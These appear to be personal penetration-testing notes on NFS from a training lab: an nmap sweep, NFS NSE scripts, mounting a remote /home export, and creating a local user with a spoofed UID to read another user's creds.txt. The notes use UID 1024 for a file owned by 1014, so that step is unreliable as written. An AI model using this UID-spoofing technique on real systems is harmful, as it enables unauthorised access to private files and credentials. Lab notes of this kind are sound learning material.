# NFS

Port : `111 (TCP, UDP), 2049 (TCP, UDP)`

## NMAP scan
```sh
┌──(grenierdev㉿kali)-[~]
└─$ sudo nmap -n -sS -T3 --reason 10.11.1.0/24 -p111,2049 --open -oG - | grep "Ports: " | awk '{print $2}' | tee nfshosts

# NMAP scripts
┌──(grenierdev㉿kali)-[~]
└─$ for s in $(locate .nse | grep "nfs"); do echo -n $s "\t" && echo $(cat $s | grep -oh -P -z "(?Us)description\s*=\s*\[\[\s*\K.*\]\]" | tr -d '\n' | head -c 100); done
/usr/share/nmap/scripts/nfs-ls.nse      Attempts to get useful information about files from NFS exports.The output is intended to resemble t
/usr/share/nmap/scripts/nfs-showmount.nse       Shows NFS exports, like the <code>showmount -e</code> command.]] 
/usr/share/nmap/scripts/nfs-statfs.nse  Retrieves disk space statistics and information from a remote NFS share.The output is intended to re
```

## Mount drive
```sh
┌──(grenierdev㉿kali)-[~]
└─$ sudo mount -o nolock 10.11.1.72:/home /tmp/home
```

## Read content with local users
```sh
┌──(grenierdev㉿kali)-[~]
└─$ cd /tmp/home && ls
jenny  joe45  john  marcus  ryuu

┌──(grenierdev㉿kali)-[~]
└─$ cd marcus && ls -la
total 24
drwxr-xr-x 2 1014  1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17  2015 ..
-rwx------ 1 1014  1014   48 Jun 10 09:16 creds.txt

# Only user 1024 can read creds, we can now use or create corresponding UID on our host to access the file
┌──(grenierdev㉿kali)-[~]
└─$ sudo useradd -u 1024 nfspwn

┌──(grenierdev㉿kali)-[~]
└─$ id -u nfspwn
1024

┌──(grenierdev㉿kali)-[~]
└─$ su nfspwn

┌──(nfspwn㉿kali)-[~]
└─$ cat creds.txt
Not what you are looking for, try harder!!! :O)
```